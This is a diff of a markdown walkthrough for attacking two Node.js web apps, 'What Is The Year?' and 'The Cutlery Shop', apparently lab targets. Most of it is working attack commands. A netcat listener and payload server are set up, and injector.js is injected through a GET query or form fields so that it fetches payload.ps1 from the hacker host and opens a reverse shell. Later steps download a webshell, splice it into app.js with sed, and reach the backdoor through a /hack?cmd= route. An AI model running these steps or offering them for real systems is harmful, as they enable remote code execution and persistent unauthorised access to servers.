@@ -1,51 +1,58 @@
 <h1 align="center">1 Initial Stage</h2>
 
+
+<div align="center">
+
+</div>
+
+`(h)` = hacker terminal, `(v)` = netcat reverse shell, `tcs` = The Cutlery Shop, `wity` = What Is The Year.
+
 ## 1.1 Start a netcat listener
 Before performing the attack, the hacker machine must host a web server. Which will listen for [reverse tcp](https://www.acunetix.com/blog/web-security-zone/what-is-reverse-shell/) connections, the following example uses [openbsd-netcat](https://man.openbsd.org/nc.1).
 ```
-nc -lvnp 8000
+(h) $ nc -lvnp 8000
 ```
 
 ## 1.2 Start a payload server
-Since [inject.js](./inject.js) will retrieve a second stage payload from the hacker machine we have to make that file available to the victim.
+Since [injector.js](./injector.js) will retrieve a second stage file [payload.ps1](./payload.ps1) from the hacker machine we have to make that file available to the victim.
 ```
-cd payload/Windows
-python -m http.server 5000
+(h) $ cd payload/Windows
+(h) $ python -m http.server 5000
 ```
 
 ## 1.3 Customise payload details
 Open command prompt and find out the local IPv4 address of your hacker machine.
 ```
-ip addr
+(h) $ ip addr
 ```
-Open [inject.js](./inject.js) and modify it according to the IPv4 address of your hacker machine.
+Open [injector.js](./injector.js) and modify it according to the IPv4 address of your hacker machine.
 ```
-# inject.js
+# injector.js
 ... DownloadString("http://<hacker-ip>:5000/payload.ps1") ...
 ```
 
-## 1.4 Injecting payload into "What Is The Year" web app
+## 1.4 Injecting payload into "What Is The Year?" web app
 ### Method 1 - Copy Paste
-Copy the contents of the [inject.js](./inject.js) file.
+Copy the contents of the [injector.js](./injector.js) file.
 ```
-type payload/Windows/inject.js | clip
+(h) $ xclip -in payload/Windows/injector.js -selection clipboard
 ```
-And paste the contents of [inject.js](inject.js) into the `year` HTTP GET Query
+And paste the contents of [injector.js](injector.js) into the `year` HTTP GET Query
 ```
-curl -G --data-urlencode "year=<payload>" http://<victim-ip>:3000
+(h) $ curl -G --data-urlencode "year=<payload>" http://<victim-ip>:3000
 ```
 ### Method 2 - Server/Client
 We utilise cURL to inject the payload to the victim web server
 ```
-curl -G --data-urlencode "year=$(curl -s http://<hacker-ip>:5000/inject.js)" http://<victim-ip>:3000
+(h) $ curl -G --data-urlencode "year=$(curl -s http://<hacker-ip>:5000/injector.js)" http://<victim-ip>:3000
 ```
 
 ## 1.5 Injecting payload into "The Cutlery Shop" web app
-Using the form fields of the application, you can perform a string escape on the `Name` field, and inject the contents of [inject.js](./inject.js) there.
+Using the form fields of the application, you can perform a string escape on the `Name` field, and inject the contents of [injector.js](./injector.js) there.
 
 ![string-escape](../../images/string-escape.png)
 
-Alternatively, you can simply paste [inject.js](./inject.js) into the `Price` field, since it does not take a string input.
+Alternatively, you can simply paste [injector.js](./injector.js) into the `Price` field, since it does not take a string input.
 
 ![direct-inject](../../images/direct-inject.png)
 
@@ -70,53 +77,74 @@ views
 ## 2.2 Webshell Backdoor
 The reverse shell provides us the privilege of the compromised user, but it is a temporary foothold in the system. To gain persistence, we can introduce a webshell as a secondary entry into the system.
 
-The [wity-webshell.js](./wity-webshell.js) and [tcs-webshell.js](./tcs-webshell.js) files contains a snippet of code prepared in advance, which adds a webshell to the NodeJS application. You must use the appropriate webshell file matching the name of the web app you are running.
+The [wity-webshell.js](../Webshells/wity-webshell.js) and [tcs-webshell.js](../Webshells/tcs-webshell.js) files contains a snippet of code prepared in advance, which adds a webshell to the NodeJS application. You must use the appropriate webshell file matching the name of the web app you are running.
 
-__Note:__ `tcs` = The Cutlery Shop, `wity` = What Is The Year
 
 ## 2.3 Creating Webshell File
-It is slightly inconvenient to create text files with very specific contents from a primitive reverse shell. Here are some of the techniques that I use to create malicious files on the server.
+It is slightly inconvenient to create text files with very specific contents from a primitive reverse shell. Here is one technique that I use to create malicious files on the server.
 
-### Method 1 - Cat Command
-Using the `cat` linux command create a file on the victim's server, by manually typing or pasting the contents of webshell file, excluding the `...` like so:
-```
-(victim) $ cat > webshell.js <<EOF
-... PASTE PAYLOAD HERE ...
-EOF
-```
-__Note:__ Typing `EOF` will end the command make sure to paste the code before typing `EOF` at the end.
-
-### Method 2 - File Download
+### File Upload
 Host a web server from `payload/Webshells` directory
 ```
-(hacker) $ cd payload
-(hacker) $ php -S 0.0.0.0:5000
+(h) $ cd payload/Webshells
+(h) $ php -S 0.0.0.0:5000
 ```
 Then use the reverse shell to download it on the victim's machine.  
 ```
-(victim) $ curl -O http://<hacker-ip>:5000/webshell.js
+(v) $ IWR "http://<hacker-ip>:5000/webshell.js" -OutFile .\webshell.js
 ```
-
-__Note:__ `hacker` is a local terminal session and `victim` is the netcat reverse shell
 
 ## 2.4 Editing Files In Powershell
 The most important file in both web applications is the `app.js` file. Because it contains all the routes to the frontend pages, but in a real scenario, files of interests may vary. 
 
-[AFAIK](https://www.urbandictionary.com/define.php?term=afaik), there are no easy ways to edit text files straight from powershell. Even if you have access to a reverse shell and install editors like [vim](https://www.vim.org/) or [nano](https://www.nano-editor.org/) on the victim machine. Due to the nature of this hack, terminal text editors will not function properly
+[AFAIK](https://www.urbandictionary.com/define.php?term=afaik), there are no easy ways to edit text files straight from powershell. Even if you have access to a reverse shell and install editors like [vim](https://www.vim.org/) or [nano](https://www.nano-editor.org/) on the victim machine. Due to the nature of this hack, some terminal text editors will not function properly
 
-Which leaves you with only one easy option, which is to edit the file locally:
-### Step 1 - Get app.js
+Which leaves you with only one easy option, that is to edit the file locally:
+### Step 1 - Spawn a new netcat session
+kill the current reverse shell and start a new netcat listener in the hacker machine, and capture the output into a file:
 ```
-cat app.js
+(h) $ nc -lvnp 8000 | tee output.txt
+```
+If `tee` is not installed in your system, just redirect the output to a file, and monitor updates with `tail`.
+```
+# terminal 1
+(h) $ nc -lvnp 8000 > output.txt
+
+# terminal 2
+(h) $ tail -F output.txt
 ```
 
+### Step 2 - Read the contents of `app.js`
+Repeat the steps to use `injector.js` and spawn a reverse shell
+```
+(h) $ curl -G --data-urlencode "year=$(curl -s http://<hacker-ip>:5000/injector.js)" http://<victim-ip>:3000
+```
+Read the contents of `app.js` and keep this reverse shell alive
+```
+(v) $ cat app.js
+```
+
+### Step 3 - Upload modified `app.js`
+Copy the local file `output.txt` to a local `app.js` and delete unnecessary outputs. Then edit line 39 to include the appropriate [webshell](../Webshells).
+```
+(h) $ cp output.txt app.js
+(h) $ sed -i "39r payload/Webshells/webshell.js" app.js
+```
+Host a server in the current working directory just like in earlier steps.
+```
+(h) $ python -m http.server 5000
+```
+Then upload the maliciously crafted file to the victim web server.
+```
+(v) $ IWR "http://<hacker-ip>:5000/app.js" -OutFile .\app.js
+```
 ## 2.5 Using The Backdoor
 
 The payload will spawn a webshell which you can access from the `/hack` route in `http://<victim-ip>:3000`. Commands can be executed by appending them in front of the `cmd` HTTP GET Query.
 
 Using the cURL program
 ```
-curl -G --data-urlencode "cmd=<command>" http://<victim-ip>:3000/hack
+(h) $ curl -G --data-urlencode "cmd=<command>" http://<victim-ip>:3000/hack
 ```
 
 Using a web browser
